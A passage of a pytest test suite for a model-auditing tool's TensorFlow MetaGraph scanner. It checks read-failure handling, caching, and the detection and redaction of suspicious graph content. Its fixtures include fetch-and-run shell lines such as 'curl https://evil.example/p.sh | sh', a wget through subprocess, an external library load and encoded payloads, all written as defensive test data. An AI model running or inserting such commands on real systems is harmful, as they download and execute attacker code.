from __future__ import annotations

import importlib
import json
import os
from pathlib import Path
from typing import Any, cast

import pytest

from modelaudit.cache import get_cache_manager, reset_cache_manager
from modelaudit.core import determine_exit_code, scan_model_directory_or_file
from modelaudit.scanner_results import INCONCLUSIVE_SCAN_OUTCOME
from modelaudit.scanners._evidence_redaction import (
    REDACTED_EVIDENCE_VALUE,
)
from modelaudit.scanners._evidence_redaction import (
    redact_evidence_string as _redact_evidence_string,
)
from modelaudit.scanners.base import IssueSeverity
from modelaudit.scanners.tf_metagraph_scanner import (
    _MAX_ATTR_VALUE_BYTES,
    _MAX_PARSE_BYTES,
    DISCOVERY_ASSUMPTIONS,
    TensorFlowMetaGraphScanner,
    _attr_strings_with_lowered_values,
    _attribute_context_name,
    _AttrString,
    _redact_metagraph_evidence,
)
from modelaudit.utils.helpers import cache_decorator
from modelaudit.utils.tensorflow_compat import has_tensorflow_protobuf_stubs as _has_tf_protos

pytestmark = pytest.mark.skipif(not _has_tf_protos(), reason="TensorFlow protobuf stubs unavailable")


def test_attribute_context_name_handles_many_generated_suffixes() -> None:
    attr_name = "Authorization" + (".func.name" * 20_000)

    assert _attribute_context_name(attr_name) == "Authorization"


def _get_metagraph_class() -> type:
    import modelaudit.protos  # noqa: F401

    meta_graph_pb2 = importlib.import_module("tensorflow.core.protobuf.meta_graph_pb2")
    return cast(type, meta_graph_pb2.MetaGraphDef)


def _build_metagraph(
    *,
    graph_nodes: list[dict[str, object]],
    function_nodes: list[dict[str, object]] | None = None,
    collection_bytes: dict[str, list[bytes]] | None = None,
) -> bytes:
    metagraph_cls = _get_metagraph_class()
    metagraph = metagraph_cls()

    metagraph.meta_info_def.meta_graph_version = "modelaudit_test_meta_graph"
    metagraph.meta_info_def.tags.append("serve")

    def add_node_attrs(node: Any, node_spec: dict[str, object]) -> None:
        attrs = node_spec.get("attrs", {})
        if isinstance(attrs, dict):
            for attr_name, attr_value in attrs.items():
                if isinstance(attr_value, bytes):
                    node.attr[str(attr_name)].s = attr_value
                else:
                    node.attr[str(attr_name)].s = str(attr_value).encode("utf-8")

        function_ref = node_spec.get("function_ref")
        if isinstance(function_ref, str):
            node.attr["f"].func.name = function_ref

        function_refs = node_spec.get("function_refs", {})
        if isinstance(function_refs, dict):
            for attr_name, function_name in function_refs.items():
                node.attr[str(attr_name)].func.name = str(function_name)

    for node_spec in graph_nodes:
        node = metagraph.graph_def.node.add()
        node.name = str(node_spec["name"])
        node.op = str(node_spec["op"])
        add_node_attrs(node, node_spec)

    if function_nodes:
        function = metagraph.graph_def.library.function.add()
        function.signature.name = "test_function"
        for node_spec in function_nodes:
            node = function.node_def.add()
            node.name = str(node_spec["name"])
            node.op = str(node_spec["op"])
            add_node_attrs(node, node_spec)

    if collection_bytes:
        for key, values in collection_bytes.items():
            collection = metagraph.collection_def[key]
            for value in values:
                collection.bytes_list.value.append(value)

    return cast(bytes, metagraph.SerializeToString())


def _assert_metagraph_read_failure_metadata(metadata: Any) -> None:
    assert metadata["scan_outcome"] == INCONCLUSIVE_SCAN_OUTCOME
    assert metadata["scan_outcome_reasons"] == ["metagraph_read_failed"]
    assert metadata["operational_error_reason"] == "metagraph_read_failed"


def test_tf_metagraph_attr_lowering_reuses_shared_values() -> None:
    class CountingStr(str):
        lower_calls = 0

        def lower(self) -> str:
            type(self).lower_calls += 1
            return super().lower()

    attr_value = CountingStr("BASE64 payload")

    lowered_values = _attr_strings_with_lowered_values((_AttrString("payload", attr_value, len(attr_value)),))

    assert lowered_values == ((_AttrString("payload", attr_value, len(attr_value)), "base64 payload"),)
    assert CountingStr.lower_calls == 1


def test_tf_metagraph_scanner_can_handle_strict(tmp_path: Path) -> None:
    valid_meta = tmp_path / "model.meta"
    valid_meta.write_bytes(
        _build_metagraph(graph_nodes=[{"name": "input", "op": "Placeholder"}, {"name": "const", "op": "Const"}])
    )

    renamed_non_meta = tmp_path / "not_meta.meta"
    renamed_non_meta.write_text("this is not protobuf", encoding="utf-8")

    wrong_extension = tmp_path / "graph.pb"
    wrong_extension.write_bytes(valid_meta.read_bytes())

    assert TensorFlowMetaGraphScanner.can_handle(str(valid_meta)) is True
    assert TensorFlowMetaGraphScanner.can_handle(str(renamed_non_meta)) is False
    assert TensorFlowMetaGraphScanner.can_handle(str(wrong_extension)) is False


def test_tf_metagraph_scanner_can_handle_oversized_meta_for_fail_closed_scan(tmp_path: Path) -> None:
    oversized_meta = tmp_path / "oversized.meta"
    seed = _build_metagraph(graph_nodes=[{"name": "pyfunc_node", "op": "PyFunc"}])
    oversized_meta.write_bytes(seed + b"A" * (_MAX_PARSE_BYTES + 1 - len(seed)))

    assert TensorFlowMetaGraphScanner.can_handle(str(oversized_meta)) is True

    result = TensorFlowMetaGraphScanner().scan(str(oversized_meta))

    assert result.success is False
    assert result.metadata["operational_error"] is True
    assert result.metadata["operational_error_reason"] == "metagraph_parse_budget_exceeded"
    assert any(issue.message and "MetaGraph exceeds bounded parse budget" in issue.message for issue in result.issues)

    audit_result = scan_model_directory_or_file(str(oversized_meta))

    assert determine_exit_code(audit_result) == 2


def test_tf_metagraph_scanner_can_handle_stat_failure_for_owned_extension(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    unreadable_meta = tmp_path / "unreadable.meta"
    unreadable_meta.write_bytes(_build_metagraph(graph_nodes=[{"name": "input", "op": "Placeholder"}]))

    def raise_os_error(_path: str) -> int:
        raise OSError("simulated MetaGraph stat failure")

    monkeypatch.setattr("modelaudit.scanners.tf_metagraph_scanner.os.path.getsize", raise_os_error)

    assert TensorFlowMetaGraphScanner.can_handle(str(unreadable_meta)) is True


def test_tf_metagraph_scanner_read_failure_is_operational_not_security_finding(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    unreadable_meta = tmp_path / "unreadable.meta"
    unreadable_meta.write_bytes(_build_metagraph(graph_nodes=[{"name": "input", "op": "Placeholder"}]))

    def raise_os_error(_path: str, _limit: int) -> tuple[bytes, bool]:
        raise OSError("simulated MetaGraph read failure")

    monkeypatch.setattr("modelaudit.scanners.tf_metagraph_scanner._read_bounded", raise_os_error)

    result = TensorFlowMetaGraphScanner().scan(str(unreadable_meta))
    audit_result = scan_model_directory_or_file(str(unreadable_meta), cache_scan_results=False)

    read_checks = [check for check in result.checks if check.name == "MetaGraph File Read"]
    assert len(read_checks) == 1
    assert read_checks[0].severity == IssueSeverity.INFO
    assert read_checks[0].details["analysis_incomplete"] is True
    assert read_checks[0].details["scan_outcome_reason"] == "metagraph_read_failed"
    assert read_checks[0].details["operational_error_reason"] == "metagraph_read_failed"
    _assert_metagraph_read_failure_metadata(result.metadata)
    assert result.metadata["operational_error"] is True
    _assert_metagraph_read_failure_metadata(audit_result.file_metadata[str(unreadable_meta)])
    assert not [
        issue for issue in audit_result.issues if issue.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL}
    ]
    assert determine_exit_code(audit_result) == 2


def test_tf_metagraph_probe_failures_still_route_to_operational_scan(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    unreadable_meta = tmp_path / "unreadable.meta"
    unreadable_meta.write_bytes(_build_metagraph(graph_nodes=[{"name": "input", "op": "Placeholder"}]))

    def raise_detection_error(_path: str) -> str:
        raise OSError("simulated MetaGraph detection read failure")

    def raise_zip_error(_path: str) -> bool:
        raise OSError("simulated ZIP probe read failure")

    def raise_read_error(_path: str, _limit: int) -> tuple[bytes, bool]:
        raise OSError("simulated MetaGraph scanner read failure")

    monkeypatch.setattr("modelaudit.core.detect_file_format", raise_detection_error)
    monkeypatch.setattr("modelaudit.scanners.zipfile.is_zipfile", raise_zip_error)
    monkeypatch.setattr("modelaudit.scanners.tf_metagraph_scanner._read_bounded", raise_read_error)

    aggregate = scan_model_directory_or_file(str(unreadable_meta), cache_scan_results=False)
    metadata = aggregate.file_metadata[str(unreadable_meta)]

    _assert_metagraph_read_failure_metadata(metadata)
    assert determine_exit_code(aggregate) == 2


def test_tf_metagraph_read_failure_result_is_not_cached(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    unreadable_meta = tmp_path / "unreadable.meta"
    unreadable_meta.write_bytes(_build_metagraph(graph_nodes=[{"name": "input", "op": "Placeholder"}]))
    cache_dir = tmp_path / "cache"

    def raise_read_error(_path: str, _limit: int) -> tuple[bytes, bool]:
        raise OSError("simulated MetaGraph scanner read failure")

    monkeypatch.setattr("modelaudit.scanners.tf_metagraph_scanner._read_bounded", raise_read_error)

    reset_cache_manager()
    try:
        first = scan_model_directory_or_file(
            str(unreadable_meta),
            cache_enabled=True,
            cache_dir=str(cache_dir),
            min_cache_file_size=0,
        )
        second = scan_model_directory_or_file(
            str(unreadable_meta),
            cache_enabled=True,
            cache_dir=str(cache_dir),
            min_cache_file_size=0,
        )

        for aggregate in (first, second):
            _assert_metagraph_read_failure_metadata(aggregate.file_metadata[str(unreadable_meta)])
            assert determine_exit_code(aggregate) == 2
        assert get_cache_manager(str(cache_dir), enabled=True).get_stats()["total_entries"] == 0
    finally:
        reset_cache_manager()


def test_tf_metagraph_single_file_scan_bypasses_stale_cache_when_read_fails(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    cached_clean = tmp_path / "cached.meta"
    cached_clean.write_bytes(_build_metagraph(graph_nodes=[{"name": "input", "op": "Placeholder"}]))
    cache_dir = tmp_path / "cache"

    reset_cache_manager()
    try:
        with monkeypatch.context() as cache_setup:
            cache_setup.setattr(
                cache_decorator,
                "should_bypass_cache_for_read_failure_aware_file",
                lambda _path: False,
            )
            first = scan_model_directory_or_file(
                str(cached_clean),
                cache_enabled=True,
                cache_dir=str(cache_dir),
                min_cache_file_size=0,
            )
        assert determine_exit_code(first) == 0
        cached_entries = get_cache_manager(str(cache_dir), enabled=True).get_stats()["total_entries"]
        assert cached_entries > 0

        real_open = open

        def fail_cached_meta_read(
            candidate: str | bytes | os.PathLike[str],
            *args: Any,
            **kwargs: Any,
        ) -> Any:
            if Path(os.fsdecode(candidate)).name == cached_clean.name:
                raise OSError("simulated transient MetaGraph read failure")
            return real_open(candidate, *args, **kwargs)

        monkeypatch.setattr("builtins.open", fail_cached_meta_read)

        second = scan_model_directory_or_file(
            str(cached_clean),
            cache_enabled=True,
            cache_dir=str(cache_dir),
            min_cache_file_size=0,
        )

        metadata = second.file_metadata[str(cached_clean)]
        _assert_metagraph_read_failure_metadata(metadata)
        assert determine_exit_code(second) == 2
        assert get_cache_manager(str(cache_dir), enabled=True).get_stats()["total_entries"] == cached_entries
    finally:
        reset_cache_manager()


def test_tf_metagraph_directory_scan_bypasses_stale_cache_when_read_fails_with_security_finding(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    model_dir = tmp_path / "models"
    model_dir.mkdir()
    cached_clean = model_dir / "cached.meta"
    cached_clean.write_bytes(_build_metagraph(graph_nodes=[{"name": "input", "op": "Placeholder"}]))
    malicious_meta = model_dir / "malicious.meta"
    malicious_meta.write_bytes(_build_metagraph(graph_nodes=[{"name": "payload", "op": "PyFunc"}]))
    cache_dir = tmp_path / "cache"

    reset_cache_manager()
    try:
        with monkeypatch.context() as cache_setup:
            cache_setup.setattr(
                cache_decorator,
                "should_bypass_cache_for_read_failure_aware_file",
                lambda _path: False,
            )
            first = scan_model_directory_or_file(
                str(cached_clean),
                cache_enabled=True,
                cache_dir=str(cache_dir),
                min_cache_file_size=0,
            )
        assert determine_exit_code(first) == 0
        assert get_cache_manager(str(cache_dir), enabled=True).get_stats()["total_entries"] > 0

        real_open = open

        def fail_cached_meta_read(
            candidate: str | bytes | os.PathLike[str],
            *args: Any,
            **kwargs: Any,
        ) -> Any:
            if Path(os.fsdecode(candidate)).name == cached_clean.name:
                raise OSError("simulated transient MetaGraph read failure")
            return real_open(candidate, *args, **kwargs)

        monkeypatch.setattr("builtins.open", fail_cached_meta_read)

        result = scan_model_directory_or_file(
            str(model_dir),
            cache_enabled=True,
            cache_dir=str(cache_dir),
            min_cache_file_size=0,
        )

        _assert_metagraph_read_failure_metadata(result.file_metadata[str(cached_clean)])
        assert any(issue.severity == IssueSeverity.CRITICAL for issue in result.issues)
        assert determine_exit_code(result) == 2
    finally:
        reset_cache_manager()


def test_tf_metagraph_unreadable_path_preflight_is_operational_not_security_finding(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    unreadable_meta = tmp_path / "permission-denied.meta"
    unreadable_meta.write_bytes(_build_metagraph(graph_nodes=[{"name": "input", "op": "Placeholder"}]))

    def deny_access(_path: str, _mode: int) -> bool:
        return False

    monkeypatch.setattr("modelaudit.scanners.base.os.access", deny_access)

    direct = TensorFlowMetaGraphScanner().scan(str(unreadable_meta))
    aggregate = scan_model_directory_or_file(str(unreadable_meta), cache_scan_results=False)

    _assert_metagraph_read_failure_metadata(direct.metadata)
    _assert_metagraph_read_failure_metadata(aggregate.file_metadata[str(unreadable_meta)])
    assert not [
        issue for issue in aggregate.issues if issue.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL}
    ]
    assert determine_exit_code(aggregate) == 2


def test_tf_metagraph_read_failure_takes_precedence_over_security_finding(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    malicious_meta = tmp_path / "malicious.meta"
    malicious_meta.write_bytes(_build_metagraph(graph_nodes=[{"name": "payload", "op": "PyFunc"}]))
    unreadable_meta = tmp_path / "unreadable.meta"
    unreadable_meta.write_bytes(_build_metagraph(graph_nodes=[{"name": "input", "op": "Placeholder"}]))
    original_read_bounded = importlib.import_module("modelaudit.scanners.tf_metagraph_scanner")._read_bounded

    def fail_selected_read(path: str, limit: int) -> tuple[bytes, bool]:
        if Path(path).name == unreadable_meta.name:
            raise OSError("simulated MetaGraph read failure")
        return cast(tuple[bytes, bool], original_read_bounded(path, limit))

    monkeypatch.setattr("modelaudit.scanners.tf_metagraph_scanner._read_bounded", fail_selected_read)

    aggregate = scan_model_directory_or_file(str(tmp_path), cache_scan_results=False)

    assert any(issue.severity == IssueSeverity.CRITICAL for issue in aggregate.issues)
    _assert_metagraph_read_failure_metadata(aggregate.file_metadata[str(unreadable_meta)])
    assert determine_exit_code(aggregate) == 2


def test_tf_metagraph_scanner_benign_graph_has_no_security_findings(tmp_path: Path) -> None:
    benign_meta = tmp_path / "benign.meta"
    benign_meta.write_bytes(
        _build_metagraph(
            graph_nodes=[
                {
                    "name": "notes_const",
                    "op": "Const",
                    "attrs": {
                        "summary": "Execution benchmark metrics for qa run. Contains eval word in plain metadata only."
                    },
                },
                {"name": "inference", "op": "MatMul"},
            ]
        )
    )

    result = TensorFlowMetaGraphScanner().scan(str(benign_meta))

    assert result.success is True
    assert result.has_errors is False
    assert result.has_warnings is False
    assert result.metadata.get("graph_node_count") == 2


def test_tf_metagraph_scanner_skips_redaction_for_non_finding_evidence(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    """Clean and explicitly benign nodes should not enter the evidence redaction path."""
    benign_meta = tmp_path / "benign-redaction.meta"
    benign_meta.write_bytes(
        _build_metagraph(
            graph_nodes=[
                {"name": "plain_const", "op": "Const", "attrs": {"summary": "public metadata"}},
                {"name": "checkpoint", "op": "SaveV2", "attrs": {"filename": "public-checkpoint"}},
            ],
            collection_bytes={"public_notes": [b"public metadata"]},
        )
    )
    redaction_calls = 0

    def count_redaction_calls(text: str, max_chars: int | None = 180) -> str:
        nonlocal redaction_calls
        redaction_calls += 1
        return _redact_evidence_string(text, max_chars=max_chars)

    monkeypatch.setattr(
        "modelaudit.scanners.tf_metagraph_scanner.redact_evidence_string",
        count_redaction_calls,
    )

    result = TensorFlowMetaGraphScanner().scan(str(benign_meta))

    assert result.success is True
    assert redaction_calls == 0


def test_tf_metagraph_scanner_detects_unsafe_ops_and_executable_payload_signals(tmp_path: Path) -> None:
    malicious_meta = tmp_path / "malicious.meta"
    malicious_meta.write_bytes(
        _build_metagraph(
            graph_nodes=[
                {
                    "name": "pyfunc_node",
                    "op": "PyFunc",
                    "attrs": {"func": "python -c \"import os; os.system('curl https://evil.example/p.sh | sh')\""},
                },
                {
                    "name": "loader",
                    "op": "LoadLibrary",
                    "attrs": {"library_path": "/tmp/evil_payload.so"},
                },
            ],
            function_nodes=[
                {
                    "name": "fn_exec",
                    "op": "PyCall",
                    "attrs": {"script": "subprocess.run('wget https://evil.example/next', shell=True)"},
                }
            ],
            collection_bytes={"runtime_hook": [b"python -c 'import os; os.system(\"curl https://evil.example/x\")'"]},
        )
    )

    result = TensorFlowMetaGraphScanner().scan(str(malicious_meta))

    assert result.success is False
    assert any(issue.severity == IssueSeverity.CRITICAL for issue in result.issues)

    dangerous_op_issues = [issue for issue in result.issues if "Dangerous TensorFlow operation" in issue.message]
    assert dangerous_op_issues
    assert any(issue.details.get("op_type") == "PyFunc" for issue in dangerous_op_issues)

    assert any("External library/path reference" in issue.message for issue in result.issues)
    assert any(
        "Multiple independent executable-context risk indicators detected in MetaGraph" in issue.message
        for issue in result.issues
    )


def test_tf_metagraph_scanner_redacts_sensitive_previews_and_examples(tmp_path: Path) -> None:
    sensitive_url = "https://example.com/p.sh?X-Amz-Signature=SECRET123&safe=1"
    path_token = "Aa1Bb2Cc3Dd4Ee5Ff6Gg7Hh8Ii9Jj0"
    encoded_secret = "Q" * 160
    github_token = f"ghp_{'a' * 36}"
    legacy_aws_access_key = "AKIAEXAMPLEACCESSKEY"
    legacy_signature = "LEGACYSIGNATURE"
    ftps_password = "FTPSPASSWORD"
    sensitive_command = (
        f"python -c \"import os; os.system('curl {sensitive_url}&data={encoded_secret} | sh')\" "
        f"client_secret=supersecret --data {github_token}"
    )
    sensitive_meta = tmp_path / "sensitive-preview.meta"
    sensitive_meta.write_bytes(
        _build_metagraph(
            graph_nodes=[
                {
                    "name": "pyfunc_node_token=nodesecret",
                    "op": "PyFunc",
                    "attrs": {
                        "script_token=attrsecret": sensitive_command,
                        "public_script": (
                            f"python -c \"os.system('curl {sensitive_url}')\" client_secret=publicscriptsecret"
                        ),
                        "library_path": "s3://bucket/model.so?token=rawtoken",
                        "gcs_path": (
                            f"https://storage.googleapis.com/model-bucket/{path_token}/model.so"
                            "?X-Goog-Signature=GCSSECRET"
                        ),
                        "legacy_aws_path": (
                            f"ftps://user:{ftps_password}@files.example/{path_token}/model.so"
                            f"?AWSAccessKeyId={legacy_aws_access_key}&Signature={legacy_signature}"
                        ),
                        "azure_path": (f"wasbs://container@account.blob.core.windows.net/{path_token}/model.so"),
                    },
                }
            ],
            collection_bytes={"runtime_hook_token=collectionsecret": [sensitive_command.encode("utf-8")]},
        )
    )

    result = TensorFlowMetaGraphScanner().scan(str(sensitive_meta))
    serialized_result = json.dumps(
        {
            "checks": [check.to_dict() for check in result.checks],
            "issues": [issue.to_dict() for issue in result.issues],
        },
        sort_keys=True,
    )

    assert "SECRET123" not in serialized_result
    assert "supersecret" not in serialized_result
    assert "publicscriptsecret" not in serialized_result
    assert "rawtoken" not in serialized_result
    assert path_token not in serialized_result
    assert encoded_secret not in serialized_result
    assert github_token not in serialized_result
    assert "GCSSECRET" not in serialized_result
    assert "nodesecret" not in serialized_result
    assert "attrsecret" not in serialized_result
    assert "collectionsecret" not in serialized_result
    assert legacy_aws_access_key not in serialized_result
    assert legacy_signature not in serialized_result
    assert ftps_password not in serialized_result
    assert "X-Amz-Signature=<redacted>" in serialized_result
    assert "X-Goog-Signature=<redacted>" in serialized_result
    assert "AWSAccessKeyId=<redacted>" in serialized_result
    assert "Signature=<redacted>" in serialized_result
    assert "client_secret=<redacted>" in serialized_result
    assert "token=<redacted>" in serialized_result
    assert "os.system" in serialized_result
    assert "example.com/p.sh" in serialized_result


def test_tf_metagraph_scanner_redacts_secret_after_encoded_url_path(tmp_path: Path) -> None:
    project_key = f"sk-proj-{'abc_def-' * 5}"
    sensitive_url = f"https://example.com/{'A' * 160}/{project_key}/model.so"
    sensitive_meta = tmp_path / "encoded-path-preview.meta"
    sensitive_meta.write_bytes(
        _build_metagraph(
            graph_nodes=[
                {
                    "name": "pyfunc_node",
                    "op": "PyFunc",
                    "attrs": {"script": f"curl {sensitive_url}"},
                }
            ]
        )
    )

    result = TensorFlowMetaGraphScanner().scan(str(sensitive_meta))
    executable_check = next(check for check in result.checks if check.name == "MetaGraph Executable String Check")
    serialized_result = result.to_json()

    assert project_key not in serialized_result
    assert "abc_def" not in serialized_result
    assert (
        executable_check.details["value_preview"]
        == f"curl https://example.com/{REDACTED_EVIDENCE_VALUE}/{REDACTED_EVIDENCE_VALUE}/model.so"
    )


def test_redact_metagraph_evidence_canonicalizes_wholly_redacted_payload() -> None:
    assert _redact_metagraph_evidence("A" * (_MAX_ATTR_VALUE_BYTES + 1), max_chars=200) == REDACTED_EVIDENCE_VALUE


def test_redact_metagraph_evidence_redacts_complete_payload_with_slashes() -> None:
    encoded_payload = f"{'A' * 130}/{'B' * 20}"

    assert _redact_metagraph_evidence(encoded_payload, max_chars=200) == REDACTED_EVIDENCE_VALUE


def test_redact_metagraph_evidence_redacts_encoded_url_authority() -> None:
    encoded_authority = "A" * 130

    redacted = _redact_metagraph_evidence(f"curl https://{encoded_authority}/path", max_chars=200)

    assert encoded_authority not in redacted
    assert redacted == f"curl https://{REDACTED_EVIDENCE_VALUE}"


def test_redact_metagraph_evidence_redacts_oversized_authority_before_encoded_path() -> None:
    encoded_authority = "A" * 119
    encoded_path = "B" * 120

    redacted = _redact_metagraph_evidence(
        f"curl https://{encoded_authority}/{encoded_path}/path",
        max_chars=200,
    )

    assert encoded_authority not in redacted
    assert encoded_path not in redacted
    assert redacted == f"curl https://{REDACTED_EVIDENCE_VALUE}"


def test_redact_metagraph_evidence_redacts_urlsafe_encoded_payloads() -> None:
    encoded_payload = ("A_" * 59) + "A-"
    near_match = ("A_" * 59) + "A"

    assert _redact_metagraph_evidence(encoded_payload, max_chars=200) == REDACTED_EVIDENCE_VALUE
    assert _redact_metagraph_evidence(near_match, max_chars=200) == near_match


def test_tf_metagraph_scanner_flags_urlsafe_encoded_payloads_without_near_match_noise(tmp_path: Path) -> None:
    encoded_payload = ("A_" * 59) + "A-"
    near_match = ("B_" * 59) + "B"
    suspicious_meta = tmp_path / "urlsafe-encoded.meta"
    benign_meta = tmp_path / "urlsafe-near-match.meta"
    suspicious_meta.write_bytes(
        _build_metagraph(
            graph_nodes=[
                {
                    "name": "encoded_node",
                    "op": "PyFunc",
                    "attrs": {"script": f"base64.b64decode('{encoded_payload}')"},
                }
            ]
        )
    )
    benign_meta.write_bytes(
        _build_metagraph(
            graph_nodes=[
                {
                    "name": "near_match_node",
                    "op": "PyFunc",
                    "attrs": {"script": f"base64.b64decode('{near_match}')"},
                }
            ]
        )
    )

    suspicious_result = TensorFlowMetaGraphScanner().scan(str(suspicious_meta))
    benign_result = TensorFlowMetaGraphScanner().scan(str(benign_meta))
    encoded_check = next(check for check in suspicious_result.checks if check.name == "MetaGraph Encoded Payload Check")

    assert encoded_check.details["value_preview"] == f"base64.b64decode('{REDACTED_EVIDENCE_VALUE}')"
    assert encoded_payload not in suspicious_result.to_json()
    assert not any(check.name == "MetaGraph Encoded Payload Check" for check in benign_result.checks)


def test_tf_metagraph_scanner_normalizes_sensitive_collection_key_separators(tmp_path: Path) -> None:
    secret = "REAL_UNICODE_COLLECTION_SECRET"
    public_value = "PUBLIC_OAUTH_CONTEXT"
    sensitive_key = "runtime\uff3fauth"
    public_key = "runtime\uff3foauth"
    collection_meta = tmp_path / "unicode-collection-key.meta"
    collection_meta.write_bytes(
        _build_metagraph(
            graph_nodes=[],
            collection_bytes={
                sensitive_key: [f"curl https://example.com/ {secret}".encode()],
                public_key: [f"curl https://example.com/ {public_value}".encode()],
            },
        )
    )

    result = TensorFlowMetaGraphScanner().scan(str(collection_meta))
    collection_checks = {
        check.details["collection_key"]: check
        for check in result.checks
        if check.name == "MetaGraph Collection Executable Pattern"
    }

    assert collection_checks[sensitive_key].details["value_preview"] == REDACTED_EVIDENCE_VALUE
    assert public_value in collection_checks[public_key].details["value_preview"]
    assert secret not in result.to_json()


def test_tf_metagraph_scanner_preserves_benign_public_preview_context(tmp_path: Path) -> None:
    public_url = "https://example.com/p.sh?variant=public"
    public_context = f"subprocess.run('wget {public_url}', shell=True) markers ghp_short sk-proj-example"
    public_meta = tmp_path / "public-preview.meta"
    public_meta.write_bytes(
        _build_metagraph(
            graph_nodes=[
                {
                    "name": "pyfunc_node",
                    "op": "PyFunc",
                    "attrs": {"script": public_context},
                }
            ]
        )
    )

    result = TensorFlowMetaGraphScanner().scan(str(public_meta))
    executable_checks = [check for check in result.checks if check.name == "MetaGraph Executable String Check"]

    assert len(executable_checks) == 1
    assert executable_checks[0].details["value_preview"] == public_context


def test_tf_metagraph_scanner_redacts_values_named_by_sensitive_context(tmp_path: Path) -> None:
    attr_secret = "REAL_ATTR_SECRET"
    collection_secret = "REAL_COLLECTION_SECRET"
    sensitive_meta = tmp_path / "sensitive-context.meta"
    sensitive_meta.write_bytes(
        _build_metagraph(
            graph_nodes=[
                {
                    "name": "sensitive_attr",
                    "op": "PyFunc",
                    "attrs": {
                        "client_secret": f"curl https://example.com/?value={attr_secret}",
                        "client_secretary": "curl https://example.com/?variant=public",
                    },
                }
            ],
            collection_bytes={
                "runtime_hook_client_secret": [
                    f"python -c 'curl https://example.com/?value={collection_secret} | sh'".encode()
                ]
            },
        )
    )

    result = TensorFlowMetaGraphScanner().scan(str(sensitive_meta))
    executable_checks = [check for check in result.checks if check.name == "MetaGraph Executable String Check"]
    previews_by_attribute = {check.details["attribute"]: check.details["value_preview"] for check in executable_checks}
    collection_check = next(check for check in result.checks if check.name == "MetaGraph Collection Executable Pattern")
    serialized_result = result.to_json()

    assert previews_by_attribute["client_secret"] == REDACTED_EVIDENCE_VALUE
    assert previews_by_attribute["client_secretary"] == "curl https://example.com/?variant=public"
    assert collection_check.details["value_preview"] == REDACTED_EVIDENCE_VALUE
    assert attr_secret not in serialized_result
    assert collection_secret not in serialized_result


def test_tf_metagraph_scanner_redacts_sensitive_function_attribute_context(tmp_path: Path) -> None:
    secret = "REAL_FUNCTION_ATTRIBUTE_SECRET"
    suffix_collision_secret = "REAL_SUFFIX_COLLISION_SECRET"
    direct_suffix_collision_secret = "REAL_DIRECT_SUFFIX_COLLISION_SECRET"
    sensitive_meta = tmp_path / "sensitive-function-context.meta"
    sensitive_meta.write_bytes(
        _build_metagraph(
            graph_nodes=[
                {
                    "name": "sensitive_function_attr",
                    "op": "StatefulPartitionedCall",
                    "attrs": {
                        "basic_auth.func.name": f"curl https://example.com/?value={direct_suffix_collision_secret}"
                    },
                    "function_refs": {
                        "Authorization": f"curl https://example.com/?value={secret}",
                        "Authorization.func.name": f"curl https://example.com/?value={suffix_collision_secret}",
                        "authorization_status": "curl https://example.com/?variant=public",
                    },
                }
            ]
        )
    )

    result = TensorFlowMetaGraphScanner().scan(str(sensitive_meta))
    executable_checks = [check for check in result.checks if check.name == "MetaGraph Executable String Check"]
    previews_by_attribute = {check.details["attribute"]: check.details["value_preview"] for check in executable_checks}

    assert previews_by_attribute["Authorization.func.name"] == REDACTED_EVIDENCE_VALUE
    assert previews_by_attribute["Authorization.func.name.func.name"] == REDACTED_EVIDENCE_VALUE
    assert previews_by_attribute["basic_auth.func.name"] == REDACTED_EVIDENCE_VALUE
    assert previews_by_attribute["authorization_status.func.name"] == "curl https://example.com/?variant=public"
    assert secret not in result.to_json()
    assert suffix_collision_secret not in result.to_json()
    assert direct_suffix_collision_secret not in result.to_json()


def test_tf_metagraph_scanner_redacts_escaped_and_container_context_secrets(tmp_path: Path) -> None:
    escaped_secrets = {
        "unicode": "REAL_UNICODE_ESCAPE_SECRET",
        "hex": "REAL_HEX_ESCAPE_SECRET",
        "octal": "REAL_OCTAL_ESCAPE_SECRET",
        "literal": "REAL_LITERAL_ESCAPE_SECRET",
        "long_unicode": "REAL_LONG_UNICODE_ESCAPE_SECRET",
        "named_unicode": "REAL_NAMED_UNICODE_ESCAPE_SECRET",
        "braced_unicode": "REAL_BRACED_UNICODE_ESCAPE_SECRET",
        "short_octal": "REAL_SHORT_OCTAL_ESCAPE_SECRET",
        "mnemonic_alert": "REAL_ALERT_ESCAPE_SECRET",
        "mnemonic_backspace": "REAL_BACKSPACE_ESCAPE_SECRET",
        "mnemonic_form_feed": "REAL_FORM_FEED_ESCAPE_SECRET",
        "mnemonic_newline": "REAL_NEWLINE_ESCAPE_SECRET",
        "mnemonic_carriage_return": "REAL_CARRIAGE_RETURN_ESCAPE_SECRET",
        "mnemonic_tab": "REAL_TAB_ESCAPE_SECRET",
        "mnemonic_vertical_tab": "REAL_VERTICAL_TAB_ESCAPE_SECRET",
        "line_continuation": "REAL_LINE_CONTINUATION_SECRET",
        "crlf_continuation": "REAL_CRLF_CONTINUATION_SECRET",
        "node": "REAL_NODE_ESCAPE_SECRET",
        "auth": "REAL_OPAQUE_AUTH_SECRET",
        "auth_header": "REAL_OPAQUE_AUTH_HEADER_SECRET",
        "cookie": "REAL_OPAQUE_COOKIE_SECRET",
    }
    escaped_meta = tmp_path / "escaped-context.meta"
    line_continuation = "token\\" + "\n=" + escaped_secrets["line_continuation"]
    crlf_continuation = "token\\" + "\r\n=" + escaped_secrets["crlf_continuation"]
    escaped_meta.write_bytes(
        _build_metagraph(
            graph_nodes=[
                {
                    "name": rf"pyfunc-token\u003d{escaped_secrets['node']}",
                    "op": "PyFunc",
                    "attrs": {
                        "script": (
                            rf"python -c token\u003d{escaped_secrets['unicode']} "
                            rf"api_key\x3d{escaped_secrets['hex']} "
                            rf"client_secret\075{escaped_secrets['octal']} "
                            rf"password\={escaped_secrets['literal']} "
